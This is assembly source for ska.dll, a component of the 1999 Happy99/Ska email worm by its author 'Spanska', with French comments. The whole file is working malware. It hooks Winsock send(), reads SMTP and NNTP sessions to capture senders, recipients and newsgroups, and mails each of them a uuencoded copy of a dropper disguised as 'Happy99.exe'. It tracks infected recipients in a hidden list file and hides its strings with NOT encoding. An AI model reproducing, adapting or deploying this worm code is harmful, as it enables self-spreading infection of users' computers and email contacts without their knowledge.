;ska.dll
;if you want to understand comments, learn french or use Altavista ;)
;at the very end, you can post a message for me in alt.comp.virus
;look at the readme.rtf with WordPad for some explanations

;--------------------------- (c) Spanska 1999 ---------------------------------

.386
.model flat

;*******************************************************************************************
;***                               API WINDOWS UTILISEES                                 ***
;*******************************************************************************************

extrn       recv            :PROC
extrn       WSAGetLastError     :PROC
extrn       LocalAlloc      :PROC
extrn       LocalFree       :PROC
extrn       GetSystemDirectoryA :PROC
extrn       CreateFileA     :PROC
extrn       CreateFileMappingA  :PROC
extrn       MapViewOfFile       :PROC
extrn       UnmapViewOfFile     :PROC
extrn       GetFileSize     :PROC
extrn       CloseHandle     :PROC
extrn       WriteFile       :PROC
extrn       ReadFile        :PROC
extrn       SetFilePointer      :PROC

.data

;*******************************************************************************************
;***                                  ZONE DE DONNEES                                    ***
;*******************************************************************************************

;======================== commandes pour les serveurs ======================================

smtp_sender_size    dd ?
smtp_recipient_size dd ?

smtp_rset       db "RSET",0Dh,0Ah
size_smtp_rset      equ $-offset smtp_rset

smtp_data       db "DATA",0Dh,0Ah
size_smtp_data      equ $-offset smtp_data

nntp_post       db "POST",0Dh,0Ah
size_nntp_post      equ $-offset nntp_post

point           db 0Dh,0Ah,2Eh,0Dh,0Ah      ;"."
size_point      equ $-offset point

;========================= données pour le uucodage ========================================

filemappinghandle   dd ?
startoffilemapping  dd ?
sizeofmappedfile    dd ?
nb_45           dd ?
reste_45        db ?
nb_1000         dd ?
reste_1000      dd ?
size_uu_file        dd ?

debut           db not 0Dh, not 0Ah     ;db 0Dh,0Ah,"begin 644
            dd not "igeb"           ;Happy99.exe",0Dh,0Ah
            dd not "46 n"
            dd not "aH 4"
            dd not "9ypp"
            dd not "xe.9"
            db not "e"
            db not 0Dh, not 0Ah
size_debut      equ $-offset debut

fin         db not 60h          ;db 60h, 0Dh,0Ah,"end",0Dh,0Ah
            db not 0Dh, not 0Ah
            db not "e", not "n", not "d"
            db not 0Dh, not 0Ah
size_fin        equ $-offset fin

;============================== mes fichiers ===============================================

dropper_name        dd not "akS\"           ;db "\Ska.exe",0
            dd not "exe."
            db not 0
dropper_name_size   equ $-offset dropper_name

liste_name      dd not "sil\"           ;db "\liste.ska",0
            dd not "s.et"
            dw not "ak"
            db not 0
liste_name_size     equ $-offset liste_name

dropper_handle      dd ?
liste_handle        dd ?
liste_size      dd ?
system_dir_size     dd ?

;=================================== divers =================================================

size_headers        dd ?
offset_mem_buffer   dd ?
original_send       dd ?
no_socket       dd ?
nb_rcpt         dd 0
faut_pas_envoyer_mail   dd 0

offset_mem_buffer2_headers  dd ?        ;mem_buffer2
offset_mem_buffer2_recipient    dd ?        ;mem_buffer2 + 3000 ;ne pas séparer
offset_mem_buffer2_sender   dd ?        ;mem_buffer2 + 6000
offset_mem_buffer2_rcv      dd ?        ;mem_buffer2 + 7000
offset_mem_buffer2_system_dir   dd ?        ;mem_buffer2 + 7100

.code

dll:

;*******************************************************************************************
;***                      ROUTINES D'INITIALISATION DE LA DLL                            ***
;*******************************************************************************************

PUBLIC dllini
dllini proc

;------- Procédure de chargement ou de déchargement ?

cmp dword ptr [esp+8], 0    ;1=DLL_PROCESS_DETACH ds la proc DllEntryPoint
je dechargement_dll

cmp dword ptr [esp+8], 1    ;1=DLL_PROCESS_ATTACH ds la proc DllEntryPoint
je chargement_dll       ;pas 1, teste 0

jmp end_ini_proc

;------ Cette routine est appelée à chaque chargement de la DLL

chargement_dll:

;----- décrypter les datas

mov esi, offset debut
push esi
pop edi
mov ecx, offset dropper_handle - offset debut
decrypte:
lodsb
not al
stosb
loop decrypte

;------- se réserver 5 Ko de mémoire pour headers/rcpt si ce n'est pas deja fait

push 8*1024
push 40h
call LocalAlloc
test eax, eax
jnz ca_baigne
xor eax, eax
jmp end_ini_proc_with_problem

ca_baigne:
mov edi, offset offset_mem_buffer2_headers
stosd
add eax, 3000
stosd
add eax, 3000
stosd
add eax, 1000
stosd
add eax, 100
stosd

jmp end_ini_proc

;------ Cette routine est appelée à chaque déchargement de la DLL

dechargement_dll:

push offset_mem_buffer2_headers         ;le petit tampon intermédiaire
call LocalFree

end_ini_proc:
mov eax, 1
end_ini_proc_with_problem:
ret 12
dllini ENDP

;*******************************************************************************************
;***                                ROUTINE SEND MAIL                                    ***
;*******************************************************************************************

PUBLIC mail
mail proc

;----localise les données de la commande send

call recuperer_offset_et_taille_envoi       ;nique ebx, ecx, retourne ebx, ecx

;----- voir si ce qui est envoyé est une commande au serveur ou le corps d'un message

cmp ecx, 100
ja c_pas_une_commande_au_serveur

;==================== analyser la commande au serveur ==============================

;----- c'est une commande au serveur: récupérer des infos

mov eax, [ebx]
and eax, 0DFDFDFDFh
cmp eax, "LIAM"
jne c_pas_from
mov eax, [ebx+4]
and eax, 0DFDFDFFFh
cmp eax, "ORF "
jne c_pas_from
mov ax, word ptr [ebx+8]
and ax, 0FFDFh
cmp ax, ":M"
jne c_pas_from

;---- si c'est la commande "from", on récupère l'envoyeur et sa taille

mov esi, ebx
;mov edi, offset smtp_sender
    mov edi, offset_mem_buffer2_sender
mov smtp_sender_size, ecx
rep movsb

jmp fin_routine_mail_sans_dechargement

;----analyse les données de la commande send

c_pas_from:
mov eax, [ebx]
and eax, 0DFDFDFDFh
cmp eax, "TPCR"
jne c_pas_to
mov eax, [ebx+4]
and eax, 0FFDFDFFFh
cmp eax, ":OT "
jne c_pas_to

;---- si c'est la commande "to", on stocke ce rcpt

call stocke_le_rcpt

;---- on vérifie que ce destinataire n'a pas déjà recu le dropper

mov smtp_recipient_size, ecx
call verifie_destinataire       ;nique eax, retour eax=-1 si faut pas envoyer, 0 sinon
cmp eax, 0
je fin_routine_mail_sans_dechargement

;----- deja recu: on annule tout

mov faut_pas_envoyer_mail, -1
jmp fin_routine_mail_sans_dechargement_mais_vidage_des_rcpt

;----- fin d'analyse des commandes

c_pas_to:
jmp fin_routine_mail_sans_dechargement

;================= ce n'est pas une commande, mais un gros send ==========================

c_pas_une_commande_au_serveur:

;------ récupérer les headers

call recupere_headers               ;nique eax, retour eax=-1 si couille, 0 si OK
cmp eax, 0
jne fin_routine_mail_sans_dechargement

;------ verifier s'il y a des rcpt

mov esi, offset_mem_buffer2_recipient
lodsw
cmp ax, 00
je fin_routine_mail_sans_dechargement

;------ verifier s'il faut envoyer

cmp faut_pas_envoyer_mail, 0
jne oh_puis_merde

;======================= tout est OK, on envoit le matériel ================================

call recuperer_socket_et_original_send      ;nique ebx, eax, renvoie en mémoire

;-------- 1/ envoyer les headers du message 

mov eax, size_headers
mov ebx, offset_mem_buffer2_headers         ;HEADER
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call uucode_et_envoie

;-------- 2/ envoyer le point final

mov eax, size_point
mov ebx, offset point                   ;"."
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

;-------- 3/ envoyer la commande "reset"

mov eax, size_smtp_rset
mov ebx, offset smtp_rset               ;RSET
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

;-------- 4/ envoyer from

mov eax, smtp_sender_size
mov ebx, offset_mem_buffer2_sender          ;MAIL FROM:
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

;-------- 5/ envoyer autant de rcpt qu'il faut

mov esi, offset_mem_buffer2_recipient
mov edx, offset_mem_buffer2_sender          ;limite haute
sub edx, 50

cherche_rcpt:
xor ecx, ecx
mov ebp, esi

cherche_fin_rcpt:
lodsb
inc ecx
cmp esi, edx
ja fin_routine_mail_avec_dechargement
cmp al, 0
je envoyer_data
cmp al, 0Ah
jne cherche_fin_rcpt

mov eax, ecx
mov ebx, ebp                        ;RCPT
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement
call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

jmp cherche_rcpt

;-------- 6/ envoyer data

envoyer_data:
mov eax, size_smtp_data
mov ebx, offset smtp_data           ;DATA
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 453"
jne fin_routine_mail_avec_dechargement

;========================== fin de la routine ==================================

oh_puis_merde:
mov faut_pas_envoyer_mail, 0

fin_routine_mail_sans_dechargement_mais_vidage_des_rcpt:
mov edi, offset_mem_buffer2_recipient       ;annuler les rcpt en memoire
xor eax, eax
stosd

fin_routine_mail_sans_dechargement:
mov eax, 1              ;retour sans déchargement de ma dll
ret

fin_routine_mail_avec_dechargement:

mov eax, "MMMM"         ;retour avec déchargement de ma dll
ret

mail endp

;*******************************************************************************************
;***                                ROUTINE SEND NEWS                                    ***
;*******************************************************************************************

PUBLIC news
news proc

;----analyse les données de la commande send

call recuperer_offset_et_taille_envoi       ;nique ebx, ecx, retourne ebx, ecx

;----- voir si ce qui est envoyé est une commande au serveur ou le corps d'un message

cmp ecx, 100
jb fin_routine_news_sans_dechargement

;================== ce n'est pas une commande, mais un gros send ===========================

call recupere_headers           ;nique eax, retour eax=-1 si couille, 0 si OK

cmp eax, 0
jne fin_routine_news_sans_dechargement

call recuperer_socket_et_original_send  ;nique abx, eax, renvoie en mémoire

;-------- 1/ envoyer les headers du message 

mov eax, size_headers
mov ebx, offset_mem_buffer2_headers         ;HEADER
call envoie
cmp eax, -1
je fin_routine_news_avec_dechargement

call uucode_et_envoie

;-------- 2/ envoyer le point final

mov eax, size_point
mov ebx, offset point                   ;"."
call envoie
cmp eax, -1
je fin_routine_news_avec_dechargement

call recoit
cmp eax, " 042"
jne fin_routine_news_avec_dechargement

;-------- 3/ envoyer la commande "POST"

mov eax, size_nntp_post
mov ebx, offset nntp_post               ;POST
call envoie
cmp eax, -1
je fin_routine_news_avec_dechargement

call recoit
cmp eax, " 043"
jne fin_routine_news_avec_dechargement

;========================== fin de la routine ==================================

fin_routine_news_sans_dechargement:
mov eax, 1              ;retour sans déchargement de ma dll
ret

fin_routine_news_avec_dechargement:
mov eax, "NNNN"             ;retour avec déchargement de ma dll
ret

news endp

;*******************************************************************************************
;***               VERIFIE SI LE DESTINATAIRE A DEJA RECU LE DROPPER                     ***
;*******************************************************************************************

verifie_destinataire:
pushad
mov ebp, ebx

push 100
push offset_mem_buffer2_system_dir
call GetSystemDirectoryA        ;généralement C:\WINDOWS\SYSTEM
test eax, eax
jz stop_verifie_destinataire
mov system_dir_size, eax

mov esi, offset liste_name      ;concatenate "c:\windows\" and "list.ska"
mov edi, offset_mem_buffer2_system_dir
add edi, system_dir_size
mov ecx, liste_name_size
rep movsb

push 0                  ;handle of file with attributes to copy (0=Ludwig)
push 80h                ;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 4                  ;how to create (4=OPEN_ALWAYS)
push 0                  ;address of security descriptor (0=Ludwig)
push 0                  ;share mode (0=Prevents the file from being shared)
push 0C0000000h             ;access (read-write) mode (080000000h=GENERIC_READ)
push offset_mem_buffer2_system_dir  ;address of name of the file
call CreateFileA
inc eax
jz stop_verifie_destinataire
dec eax
mov liste_handle, eax

push 5*1024+50
push 40h
call LocalAlloc
test eax, eax
jz close_file
mov offset_mem_buffer, eax

lit_le_fichier:
push 0
push offset liste_size
push (5*1024)
push offset_mem_buffer
push liste_handle
call ReadFile
test eax, eax
jz stop_verifie_destinataire

cmp liste_size, 5*1024      ;si le fichier est plus gros que 5 Ko
jb compare_names

push liste_handle
call CloseHandle

push 0
push 80h        ;on le remet à zero
push 2          ;how to create (2=CREATE_ALWAYS)
push 0
push 0
push 0C0000000h
push offset_mem_buffer2_system_dir
call CreateFileA
inc eax
jz stop_verifie_destinataire
dec eax
mov liste_handle, eax
jmp lit_le_fichier

compare_names:

    mov esi, ebp
add esi, 8
lodsd
mov ebx, eax
lodsd
mov edx, eax

mov esi, offset_mem_buffer      ;esi=memoire
mov ecx, esi
add ecx, liste_size         ;ecx=limite haute memoire

compare_8_premiers_cara:
lodsd
cmp eax, ebx
je teste_4_8
jmp cherche_0D0A_suivant
teste_4_8:
lodsd
cmp eax, edx
je il_a_deja_recu_le_dropper

sub esi, 4
cherche_0D0A_suivant:
sub esi, 3
cherche_0D0A:
lodsw
cmp esi, ecx
jae pas_dans_la_liste
cmp ax, 0A0Dh
je compare_8_premiers_cara
dec esi
jmp cherche_0D0A

pas_dans_la_liste:

mov edi, esi
    mov esi, ebp
add esi, 8
mov ecx, smtp_recipient_size
sub ecx, 8
push ecx
push edi
rep movsb
mov ax, 0A0Dh
stosw
pop edi
pop ecx

push 0              ;addr. of structure needed for overlapped I/O (0 pour normale)
push offset liste_size      ;address of nb of bytes written (si jamais tout n'est pas écrit)
push ecx            ;number of bytes to write
push edi            ;address of data to write to file
push liste_handle       ;handle of file to write to
call WriteFile
jmp close_mem_and_file      ;test eax inutile

il_a_deja_recu_le_dropper:
push offset_mem_buffer
call LocalFree
push liste_handle
call CloseHandle
popad
mov eax, -1         ;retour avec eax=-1 si faut pas envoyer
ret

close_mem_and_file:
push offset_mem_buffer
call LocalFree

close_file:
push liste_handle
call CloseHandle

stop_verifie_destinataire:  ;s'il y a le moindre probleme, on envoie quand même
popad
xor eax, eax            ;retour avec eax=0 si c OK
ret

;*******************************************************************************************
;***                      RECUPERE LES HEADERS (MAIL OU NEWS)                            ***
;*******************************************************************************************

recupere_headers:
pushad

mov esi, ebx
mov edi, esi
add edi, ecx
mov ecx, edi
add ecx, 100        ;?
xor edx, edx

analyse:

mov bx, word ptr [esi]
and bx, 0DFDFh              ;fous-moi ce bordel en majuscules
mov ebp, esi

cmp bx, "RF"                ;maybe From:
je maybe_find_from
fausse_alerte_a1:
mov esi, ebp
cmp bx, "US"                ;maybe Subject:
je maybe_find_subject
fausse_alerte_a2:
mov esi, ebp
cmp bx, "EN"                ;maybe Newsgroups:
je maybe_find_newsgroups
fausse_alerte_a3:
mov esi, ebp
cmp bx, "CC"                ;maybe CC:
je maybe_find_cc
fausse_alerte_a4:
mov esi, ebp
cmp bx, "CB"                ;maybe BCC:
je maybe_find_bcc
fausse_alerte_a5:
mov esi, ebp
cmp bx, 0A0Dh               ;maybe end of headers
je maybe_end_headers
fausse_alerte_a6:
mov esi, ebp
inc esi
cmp esi, ecx
jae stop_analyse_headers        ;in case of header end or
jmp analyse

maybe_find_from:            ;From:
lodsw
lodsd
and eax, 0FFFFDFDFh
cmp eax, " :MO"
jne fausse_alerte_a1
call recupere_un_champ
jmp analyse

maybe_find_subject:         ;Subject:
lodsw
lodsd
and eax, 0DFDFDFDFh
cmp eax, "CEJB"
jne fausse_alerte_a2
lodsd
and eax, 0FFFFDFh
cmp eax, 0+" :T"
jne fausse_alerte_a2
call recupere_un_champ
jmp analyse

maybe_find_newsgroups:          ;Newsgroups:
lodsw
lodsd
and eax, 0DFDFDFDFh
cmp eax, "RGSW"
jne fausse_alerte_a3
lodsd
and eax, 0DFDFDFDFh
cmp eax, "SPUO"
jne fausse_alerte_a3
lodsw
cmp ax, " :"
jne fausse_alerte_a3
call recupere_un_champ
jmp analyse

maybe_find_cc:              ;CC:
lodsw
lodsd
and eax, 0FFFFh
cmp eax, 0+0+" :"
jne fausse_alerte_a4
call recupere_un_champ
jmp analyse

maybe_find_bcc:             ;BCC:
lodsw
lodsd
and eax, 0FFFFDFh
cmp eax, 0+" :C"
jne fausse_alerte_a5
call recupere_un_champ
jmp analyse

maybe_end_headers:          ;end of headers
lodsd
cmp eax, 0A0D0A0Dh
jne fausse_alerte_a6
push eax

;----rajoute mon petit champ dans le header

mov eax, "pS-X"         ;"X-Spanska: Yes" to allow easy filtering :)
stosd
mov eax, "ksna"
stosd
mov eax, "Y :a"
stosd
mov ax, "se"
stosw
add edx, 14

pop eax
stosd
inc edx
inc edx

mov size_headers, edx           ;in case of OK
popad
xor eax, eax
ret

stop_analyse_headers:           ;in case of error

popad
mov eax, -1
ret

recupere_un_champ:
mov esi, ebp
mov edi, offset_mem_buffer2_headers
add edi, edx
recopie:
lodsb
stosb
inc edx
cmp edx, 2950
ja stop_recupere_un_champ
cmp al, 0Ah
jne recopie
stop_recupere_un_champ:
ret

;*******************************************************************************************
;***                                  ENVOIE                                             ***
;*******************************************************************************************

envoie:
mov ebp, eax

envoie2:
push LARGE 0
push eax
push ebx
push LARGE no_socket
call [original_send]

cmp eax, -1
jne envoi_ok

call WSAGetLastError
cmp eax, 10035
jne stop_envoi
mov eax, ebp
jmp envoie2

stop_envoi:
mov eax, -1
envoi_ok:
ret

;*******************************************************************************************
;***               RECUPERE TAILLE ET CONTENU DE L'ENVOI EN COURS                        ***
;*******************************************************************************************

recuperer_offset_et_taille_envoi:

mov ebx, [esp+32+(5*4)] ;offset du contenu envoyé
mov ecx, [esp+32+(6*4)] ;taille du contenu
ret

;*******************************************************************************************
;***               RECUPERE No SOCKET ET OFFSET DU SEND ORIGINAL                         ***
;*******************************************************************************************

recuperer_socket_et_original_send:

;----- récupérer no de socket

mov ebx, [esp+32+(4*4)] ;no de socket
mov no_socket, ebx

;----- récupérer le saut au send original

pop eax
pop ebx
push ebx
push eax
add ebx, 34+25      ;ATTENTION!! dépend du dropper!!!!!!!!!!!!!

mov eax, [ebx]      ;recup du saut relatif depuis la fin du patch jusqu'au send original
add ebx, eax
add ebx, 4
mov original_send, ebx
ret

;*******************************************************************************************
;***                         UUCODE ET ENVOIE LE DROPPER                                 ***
;*******************************************************************************************

uucode_et_envoie:

;------- se réserver 20 Ko de mémoire

push 20*1024
push 40h
call LocalAlloc
test eax, eax
jz fin_routine_uucodage
mov offset_mem_buffer, eax

;------- récupérer le path/nom du dropper

push 100
push offset_mem_buffer2_system_dir
call GetSystemDirectoryA        ;généralement C:\WINDOWS
test eax, eax
jz fin_routine_uucodage_avec_liberer_memoire
mov system_dir_size, eax

mov esi, offset dropper_name        ;concatenate "c:\windows\" and "drop.exe"
mov edi, offset_mem_buffer2_system_dir
add edi, system_dir_size
mov ecx, dropper_name_size
rep movsb

;------- mapper le dropper en mémoire

push 0          ;handle of file with attributes to copy (0=Ludwig)
push 80h        ;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 3          ;how to create (3=OPEN_EXISTING)
push 0          ;address of security descriptor (0=Ludwig)
push 0          ;share mode (0=Prevents the file from being shared)
push 080000000h     ;access (read-write) mode (080000000h=GENERIC_READ)
push offset_mem_buffer2_system_dir  ;address of name of the file
call CreateFileA
inc eax
jz fin_routine_uucodage_avec_liberer_memoire
dec eax
mov dropper_handle, eax

push offset sizeofmappedfile    ;address of high-order word for file size (si ca dépasse)
push dropper_handle     ;handle of file to get size of 
call GetFileSize
inc eax
jz fin_routine_uucodage_avec_fermer_dropper
dec eax
mov sizeofmappedfile, eax

push 0          ;name of file-mapping object (0=sans nom)
push 0          ;low-order 32 bits of object size  
push 0          ;high-order 32 bits of object size  (0=meme taille que le fichier)
push 2          ;protection for mapping object (2=PAGE_READONLY)
push 0          ;optional security attributes (0=défaut)
push dropper_handle ;handle of file to map
call CreateFileMappingA
test eax, eax
jz fin_routine_uucodage_avec_fermer_dropper
mov filemappinghandle, eax

push 0          ;number of bytes to map (0=en entier)
push 0          ;low-order 32 bits of file offset
push 0          ;high-order 32 bits of file offset (0=meme taille que le fichier?)
push 4          ;access mode (4=SECTION_MAP_READ)
push filemappinghandle  ;file-mapping object to map into address space  
call MapViewOfFile
test eax, eax
jz fin_routine_uucodageavec_fermer_mapping
mov startoffilemapping, eax

;------ uucoder le dropper depuis son mapping (binaire) jusqu'à la zone mémoire réservée

mov esi, offset debut
mov edi, offset_mem_buffer
mov ecx, size_debut
rep movsb               ;transférer "begin xxxx.exe"

xor edx, edx
mov eax, sizeofmappedfile
push eax
mov bx, 45
div bx
xor ecx, ecx
mov cx, ax
mov nb_45, ecx
mov reste_45, dl            ;calculer le nombre de lignes

mov esi, startoffilemapping
pop ebp
add ebp, esi
mov edx, nb_45

code_ligne_suivante:
mov al, "M"
stosb
mov ecx, 15

code_trois_octets:
    cmp esi, ebp
    jne tu_peux_la_lire_cette_putain_de_memoire3
    xor al, al
    jmp evite_plantage_because_peut_pas_lire_la_memoire3
tu_peux_la_lire_cette_putain_de_memoire3:
lodsb
evite_plantage_because_peut_pas_lire_la_memoire3:
mov ah, al
shr al, 2
and al, 00111111b
jnz pas_zero1
add al, 40h
pas_zero1:
add al, 20h
stosb

mov al, ah
shl al, 4
and al, 00110000b
mov bh, al
    cmp esi, ebp
    jne tu_peux_la_lire_cette_putain_de_memoire
    xor al, al
    jmp evite_plantage_because_peut_pas_lire_la_memoire
tu_peux_la_lire_cette_putain_de_memoire:
lodsb
evite_plantage_because_peut_pas_lire_la_memoire:
mov ah, al
shr al, 4
and al, 00001111b
or al, bh
and al, 00111111b
jnz pas_zero2
add al, 40h
pas_zero2:
add al, 20h
stosb

mov al, ah
shl al, 2
and al, 11111100b
mov bh, al
    cmp esi, ebp
    jne tu_peux_la_lire_cette_putain_de_memoire2
    xor al, al
    jmp evite_plantage_because_peut_pas_lire_la_memoire2
tu_peux_la_lire_cette_putain_de_memoire2:
lodsb
evite_plantage_because_peut_pas_lire_la_memoire2:
mov ah, al
shr al, 6
and al, 00000011b
or al, bh
and al, 00111111b
jnz pas_zero3
add al, 40h
pas_zero3:
add al, 20h
stosb

mov al, ah
and al, 00111111b
jnz pas_zero4
add al, 40h
pas_zero4:
add al, 20h
stosb

dec ecx
jnz code_trois_octets

mov ax, 0A0Dh
stosw

dec edx
jnz code_ligne_suivante

code_la_derniere_ligne:

mov al, reste_45
cmp al, 0
je fin_uu
add al, 20h
stosb

xor eax, eax
xor edx, edx
xor ecx, ecx
mov al, reste_45
mov bl, 3
div bl

mov cl, al
test ah, ah
jz pas_de_reste
inc cx
pas_de_reste:

mov edx, 1
mov reste_45, 0
jmp code_trois_octets

fin_uu:
mov esi, offset fin
mov ecx, size_fin
rep movsb               ;transférer "end"

mov ecx, edi
sub ecx, offset_mem_buffer
mov size_uu_file, ecx           ;se souvenir de la taille du fichier uucodé

;-------- envoyer des paquets de 1000 octets 

xor edx, edx
xor ecx, ecx
mov eax, size_uu_file
mov bx, 1000
div bx
mov cx, ax
mov nb_1000, ecx
mov reste_1000, edx

mov esi, offset_mem_buffer
inc nb_1000

envoie_la_sauce:

mov ebp, 1000
cmp nb_1000, 1
jne morceau_entier
mov ebp, reste_1000
morceau_entier:
mov eax, ebp
mov ebx, esi
call envoie

cmp eax, -1
je fin_routine_uucodage_avec_unmap

envoi_ok2:
add esi, ebp
dec nb_1000
jnz envoie_la_sauce

;------- tout fermer: fichiers (dropper, dropper uucodé) et mémoire (mapping*2, buffer)

fin_routine_uucodage_avec_unmap:
push startoffilemapping
call UnmapViewOfFile

fin_routine_uucodageavec_fermer_mapping:
push filemappinghandle
call CloseHandle

fin_routine_uucodage_avec_fermer_dropper:
push dropper_handle
call CloseHandle

fin_routine_uucodage_avec_liberer_memoire:
push offset_mem_buffer
call LocalFree

fin_routine_uucodage:
ret

;*******************************************************************************************
;***                        RECUPERE LES MESSAGES ENTRANTS                               ***
;*******************************************************************************************

recoit:
push LARGE 0
push LARGE 60
push offset_mem_buffer2_rcv
push LARGE no_socket
call recv
cmp eax, -1
je recoit

mov ebx, offset_mem_buffer2_rcv
mov eax, [ebx]
ret

;*******************************************************************************************
;***                          STOCKER RECIPIENT EN MEMOIRE                               ***
;*******************************************************************************************

stocke_le_rcpt:
pushad
mov esi, offset_mem_buffer2_recipient
mov edx, esi
add edx, 2900               ;ecx=limite haute memoire

cherche_00_suivant:
lodsb
cmp esi, edx
jae stop_stocke_le_rcpt
cmp al, 0
jne cherche_00_suivant

stocke_a_cet_offset:
dec esi
mov edi, esi
mov esi, ebx
rep movsb
mov eax, 0
stosd

stop_stocke_le_rcpt:
popad
ret

end dll

;--------------------------- (c) Spanska 1999 ---------------------------------
